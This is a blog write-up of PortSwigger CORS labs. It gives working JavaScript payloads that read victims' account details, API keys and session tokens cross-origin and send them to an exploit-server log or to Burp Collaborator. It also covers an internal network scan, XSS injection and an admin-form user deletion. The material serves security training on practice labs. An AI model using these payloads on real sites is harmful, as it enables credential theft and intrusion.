---
date: 2021-08-31 23:48:05
layout: post
title: Cross-origin resource sharing Vulnerabilities
subtitle: PortSwigger Writeup.
description: >-
  in this blog i've explained how to Cross-origin resource sharing Vulnerabilities and labs in PortSwigger
image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/51fc5214b5722d7c0ce1944275b7a1042c628554/assets/img/CORS/attack-on-cors.svg
optimized_image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/51fc5214b5722d7c0ce1944275b7a1042c628554/assets/img/CORS/attack-on-cors.svg
category: PortSwigger
tags:
  - PortSwigger
  - injection
author: Mahmoud S. Atia
paginate: true
---








![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/e211a7cde1045728694be557f2ca23a10e3a5ece/assets/img/CORS/attack-on-cors.svg)

------------

# Note

I'll explain what Cross-origin resource sharing is, describe how vulnerabilities can be detected and exploited.

------------

# What is Cross-origin resource sharing ?

 Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.
 It extends and adds flexibility to the same-origin policy ([SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy "SOP")). However, it also provides potential for cross-domain based attacks,
 if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as
 cross-site request forgery ([CSRF](https://portswigger.net/web-security/csrf "CSRF")). 

------------


# Lab: CORS vulnerability with basic origin reflection
Intercept the request after login to the lab with credentials
send the request to the repeater
to test CORS we will add
 `origin: H3X0S3.com`
 
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-basic-origin-reflection-1.png)

fine there is a CORS bug let’s try to exploit it to gain API Key of the victim.
````
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://accb1fa91e91474980317e0f00650079.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
 
  function reqListener() {
    location='/log?key='+this.responseText;
  };
  </script>
````
to exploit the bug 
go to exploit the server 
in Body: put the code of exploitation and store it 
then deliver exploit to the victim then access log

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-basic-origin-reflection-2.png)

decode it 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-basic-origin-reflection-3.png)

`"GET /log?key={ "username": "administrator", "email": "", "apikey":"7nA1VcyXtReSvhq6jgiUpoavFkagFoYx", "sessions": [ "wPVZ8dWDpUjpjInTmyry7suNvonCxJlv" ]} HTTP/1.1" 200 "User-Agent: Chrome/495672"`
Labe Solved


------------


# Lab: CORS vulnerability with trusted null origin

Intercept the request after login to lab with credentials.
Steps
send the request to the repeater to test CORS we will add
` origin: H3X0S3.com`

 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-null-origin-1.png)
 
 we get 500 Internal Server Error ok.
Let’s try 
`Origin: null`

 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-null-origin-2.png)

the "null" origin is reflected in the Access-Control-Allow-Origin header,  so to exploit this bug we need to generate a null origin request so we will 
use an iframe sandbox.
 ````
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest ();
  req.onload = reqListener;
  req.open('get','https://ac2a1f601e8f3543806a2278000d00bf.web-security-academy.net//accountDetails',true);
  req.withCredentials = true;
  req.send();
 
  function reqListener() {
    location='https://exploit-aca81f7b1eb4351d80cd22c901ca00b0.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
  };
 </script>"></iframe> 
 ````
 go to exploit server, in Body: put the code of exploitation and store it 
view the exploit 

 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-null-origin-3.png)

 Delever exploit to victim.  Access log and search about the key
 
 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-null-origin-4.png)

 let’s decode it
 ````
 /log?key={
 "username": "wiener",
 "email": "",
 "apikey": "wCOeetn12uCexWQylzhQXy5Y1dV2elvs",
 "sessions": [
 "UJsJdrc0JeCEeF6P4IcHI80Gbfq6YFIZ"
 ]
}
````
 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-null-origin-5.png)

Labe Solved

------------

# Lab: CORS vulnerability with trusted insecure protocols

After login to the lab and intercept the request then send it to the repeater
lets to inject 
 `origin: H3X0S3.com`
 we get 500 Internal Server Error
`origin: null`
we get 500 Internal Server Error. Now we need to try to inject with a subdomain but before injecting with subdomain we should find a bug on the subdomain to allow us to inject JavaScript code.
let’s open any product and check the productid 
> stock.ac6d1f111e6b213580242fdb00b9006b.web-security-academy.net/?productId=1&storeId=1 ok it is a subdomain stock.ac6d1f111e6b213580242fdb00b9006b.web-security-academy.net/?productId=1&storeId=1
 
  ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-insecure-protocols-1.png)


let's go to exploit server 
 ````
 <script>
 document.location="http://stock.ac6d1f111e6b213580242fdb00b9006b.web-security-academy.net/?productId=2<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac6d1f111e6b213580242fdb00b9006b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-aca21fea1ed2219780872f2801c100a0.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script> 
````

in Body: put the code of exploitation and store it 
view the exploit
Delever exploit to victim. 
Access log and search about the key

  ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-insecure-protocols-2.png)

let’s decode it 

  ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-trusted-insecure-protocols-3.png)

 ````/log?key={ "username": "wiener", "email": "", "apikey": "otqfh3jTIGqErn4I8ib7VuCUlKysIHsM", "sessions": [ "rN2NxUM9pl5Pv8V0Eai8TZAPjjuVwN0s" ]}````
 
we can do this attack withot injection js code but we need to do MIM attack to redirect the victime to 
  
Labe Solved

------------

# Lab: CORS vulnerability with internal network pivot attack

After access the lab if we try to log in with any username and password we get
`"Internal Server Error" `.
Try to inject 
 `origin: H3X0S3.com`
`origin: null`
 `origin: subdomain.ac391f1e1e70e8b780907729007f003c.web-security-academy.net`
 there are no reflection headers on the response 
 ok 
 let’s try to scan the local network & now the local IP with 8080 port.
we will use burp collaborator to recive the respone.

````
<script>
var q = [], collaboratorURL = 'http://lc11qok361osfo0bxxpud7zfz65wtl.burpcollaborator.net';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
 ````
Put the code on the exploit server then store it and deliver exploit to victim 
 see our burp collaborator
 
  ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-internal-network-pivot-attack-1.png)

we get the privet IP
> 192.168.0.250:8080

we will use the 192.168.0.250:8080 as a proxy to find a xss on intern network and recive the response on burpcollaborator [blind ssrf].

Now we try to know the username 
 
 clean the code from body and put this code
 ````
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?H3X0S3forXSS=0>');
  }
  ))
}

fetchUrl("http://192.168.0.89:8080", "http://0klpcpmyumttuob8cbetz6ptkkqbe0.burpcollaborator.net");
</script>
````
And repeat the steps 

  ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-internal-network-pivot-attack-2.png)

Repeat the steps 
````
 <script>
function xss(url, text, vector) {
 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
 fetch(url).then(r=>r.text().then(text=>
 {
 xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
 }
 ))
}

fetchUrl("http://192.168.0.89:8080", "http://0klpcpmyumttuob8cbetz6ptkkqbe0.burpcollaborator.net");
</script>
````
  
  ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/CORS/CORS-vulnerability-with-internal-network-pivot-attack-3.png)
  
  Look at the Reuest to Burp Collaborator 

````
/?code=
%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fresources%2Flabheader%2Fjs%2FlabHeader.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20QdTRdgpZPWmPsBCi3SlvihRfoLIctsgZf%0A%20%20%20%20%20%20%20%20%3Cdiv%20theme%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22maincontainer%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%20is-page%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22navigation-header%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22top-links%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2F%22%3EHome%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2Fadmin%22%3EAdmin%20panel%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%2Fmy-account%3Fid%3Dadministrator%22%3EMy%20account%3C%2Fa%3E%3Cp%3E%7C%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cheader%20class%3D%22notification-header%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fheader%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20style%3D%22margin-top%3A%201em%22%20class%3D%22login-form%22%20action%3D%22%2Fadmin%2Fdelete%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%3D%22%22%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22QYBsD7rpsx1BKrnkIAeHSwmcSxOhzfjV%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EUsername%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%3D%22%22%20type%3D%22text%22%20name%3D%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22button%22%20type%3D%22submit%22%3EDelete%20user%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%0A%0A

````
let's decode it 

````

            <script src="/resources/labheader/js/labHeader.js"></script>
            QdTRdgpZPWmPsBCi3SlvihRfoLIctsgZf
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                        <input required="" type="hidden" name="csrf" value="QYBsD7rpsx1BKrnkIAeHSwmcSxOhzfjV">
                        <label>Username</label>
                        <input required="" type="text" name="username">
                        <button class="button" type="submit">Delete user</button>
                    </form>
                </div>
            </section>
        </div>
    
````
If you look there is a button to delete user 

-  <button class="button" type="submit">Delete user</button>
 
 
Now we need to delete carlos by injecting an iframe pointing to the /admin page

````
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
  }
  ))
}
fetchUrl("http://192.168.0.89:8080", "http://0klpcpmyumttuob8cbetz6ptkkqbe0.burpcollaborator.net");
</script>
````



After press deliver exploit victim. done carlose user is deleted
 
  Lab solved

![](https://media3.giphy.com/media/H4zC1A2FZ0ViA6GcxD/giphy.gif)








